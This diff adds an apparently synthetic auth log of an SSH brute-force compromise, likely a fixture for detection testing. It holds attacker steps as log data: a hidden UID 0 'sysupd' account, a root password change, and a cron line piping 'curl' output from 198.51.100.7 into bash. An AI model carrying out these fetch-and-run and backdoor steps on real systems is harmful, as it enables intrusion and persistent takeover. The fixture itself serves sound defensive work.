@@ -1,0 +1,58 @@
+Nov  5 09:00:00 web01 sshd[1001]: Accepted publickey for alice from 10.0.0.5 port 50122 ssh2: ED25519 SHA256:abc
+Nov  5 09:00:00 web01 sshd[1001]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+Nov  5 09:02:00 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+Nov  5 09:03:00 web01 CRON[1200]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+Nov  5 10:00:07 web01 sshd[2000]: Invalid user admin from 203.0.113.50 port 40000
+Nov  5 10:00:07 web01 sshd[2000]: Failed password for invalid user admin from 203.0.113.50 port 40000 ssh2
+Nov  5 10:00:14 web01 sshd[2001]: Invalid user test from 203.0.113.50 port 40001
+Nov  5 10:00:14 web01 sshd[2001]: Failed password for invalid user test from 203.0.113.50 port 40001 ssh2
+Nov  5 10:00:21 web01 sshd[2002]: Invalid user oracle from 203.0.113.50 port 40002
+Nov  5 10:00:21 web01 sshd[2002]: Failed password for invalid user oracle from 203.0.113.50 port 40002 ssh2
+Nov  5 10:00:28 web01 sshd[2003]: Invalid user ubuntu from 203.0.113.50 port 40003
+Nov  5 10:00:28 web01 sshd[2003]: Failed password for invalid user ubuntu from 203.0.113.50 port 40003 ssh2
+Nov  5 10:00:35 web01 sshd[2004]: Invalid user postgres from 203.0.113.50 port 40004
+Nov  5 10:00:35 web01 sshd[2004]: Failed password for invalid user postgres from 203.0.113.50 port 40004 ssh2
+Nov  5 10:00:42 web01 sshd[2005]: Failed password for deploy from 203.0.113.50 port 40005 ssh2
+Nov  5 10:00:49 web01 sshd[2006]: Invalid user admin from 203.0.113.50 port 40006
+Nov  5 10:00:49 web01 sshd[2006]: Failed password for invalid user admin from 203.0.113.50 port 40006 ssh2
+Nov  5 10:00:56 web01 sshd[2007]: Invalid user test from 203.0.113.50 port 40007
+Nov  5 10:00:56 web01 sshd[2007]: Failed password for invalid user test from 203.0.113.50 port 40007 ssh2
+Nov  5 10:01:03 web01 sshd[2008]: Invalid user oracle from 203.0.113.50 port 40008
+Nov  5 10:01:03 web01 sshd[2008]: Failed password for invalid user oracle from 203.0.113.50 port 40008 ssh2
+Nov  5 10:01:10 web01 sshd[2009]: Invalid user ubuntu from 203.0.113.50 port 40009
+Nov  5 10:01:10 web01 sshd[2009]: Failed password for invalid user ubuntu from 203.0.113.50 port 40009 ssh2
+Nov  5 10:01:17 web01 sshd[2010]: Invalid user postgres from 203.0.113.50 port 40010
+Nov  5 10:01:17 web01 sshd[2010]: Failed password for invalid user postgres from 203.0.113.50 port 40010 ssh2
+Nov  5 10:01:24 web01 sshd[2011]: Failed password for deploy from 203.0.113.50 port 40011 ssh2
+Nov  5 10:01:31 web01 sshd[2012]: Invalid user admin from 203.0.113.50 port 40012
+Nov  5 10:01:31 web01 sshd[2012]: Failed password for invalid user admin from 203.0.113.50 port 40012 ssh2
+Nov  5 10:01:38 web01 sshd[2013]: Invalid user test from 203.0.113.50 port 40013
+Nov  5 10:01:38 web01 sshd[2013]: Failed password for invalid user test from 203.0.113.50 port 40013 ssh2
+Nov  5 10:01:45 web01 sshd[2014]: Invalid user oracle from 203.0.113.50 port 40014
+Nov  5 10:01:45 web01 sshd[2014]: Failed password for invalid user oracle from 203.0.113.50 port 40014 ssh2
+Nov  5 10:01:52 web01 sshd[2015]: Invalid user ubuntu from 203.0.113.50 port 40015
+Nov  5 10:01:52 web01 sshd[2015]: Failed password for invalid user ubuntu from 203.0.113.50 port 40015 ssh2
+Nov  5 10:01:59 web01 sshd[2016]: Invalid user postgres from 203.0.113.50 port 40016
+Nov  5 10:01:59 web01 sshd[2016]: Failed password for invalid user postgres from 203.0.113.50 port 40016 ssh2
+Nov  5 10:02:06 web01 sshd[2017]: Failed password for deploy from 203.0.113.50 port 40017 ssh2
+Nov  5 10:02:13 web01 sshd[2018]: Invalid user admin from 203.0.113.50 port 40018
+Nov  5 10:02:13 web01 sshd[2018]: Failed password for invalid user admin from 203.0.113.50 port 40018 ssh2
+Nov  5 10:02:20 web01 sshd[2019]: Invalid user test from 203.0.113.50 port 40019
+Nov  5 10:02:20 web01 sshd[2019]: Failed password for invalid user test from 203.0.113.50 port 40019 ssh2
+Nov  5 10:02:27 web01 sshd[2020]: Invalid user oracle from 203.0.113.50 port 40020
+Nov  5 10:02:27 web01 sshd[2020]: Failed password for invalid user oracle from 203.0.113.50 port 40020 ssh2
+Nov  5 10:02:34 web01 sshd[2021]: Invalid user ubuntu from 203.0.113.50 port 40021
+Nov  5 10:02:34 web01 sshd[2021]: Failed password for invalid user ubuntu from 203.0.113.50 port 40021 ssh2
+Nov  5 10:02:41 web01 sshd[2022]: Invalid user postgres from 203.0.113.50 port 40022
+Nov  5 10:02:41 web01 sshd[2022]: Failed password for invalid user postgres from 203.0.113.50 port 40022 ssh2
+Nov  5 10:02:48 web01 sshd[2023]: Failed password for deploy from 203.0.113.50 port 40023 ssh2
+Nov  5 10:03:08 web01 sshd[2100]: Accepted password for deploy from 203.0.113.50 port 41000 ssh2
+Nov  5 10:03:08 web01 sshd[2100]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Nov  5 10:04:08 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+Nov  5 10:15:00 web01 useradd[3001]: new group: name=sysupd, GID=0
+Nov  5 10:15:00 web01 useradd[3001]: new user: name=sysupd, UID=0, GID=0, home=/var/lib/sysupd, shell=/bin/bash, from=/dev/pts/1
+Nov  5 10:15:05 web01 usermod[3002]: add 'sysupd' to group 'sudo'
+Nov  5 10:15:10 web01 passwd[3003]: pam_unix(passwd:chauthtok): password changed for root
+Nov  5 10:15:30 web01 crontab[3004]: (root) REPLACE (root)
+Nov  5 10:16:00 web01 CRON[3005]: (root) CMD (curl -s http://198.51.100.7/u.sh | bash)
+Nov  5 10:17:00 web01 sshd[3100]: Accepted password for root from 198.51.100.7 port 51515 ssh2
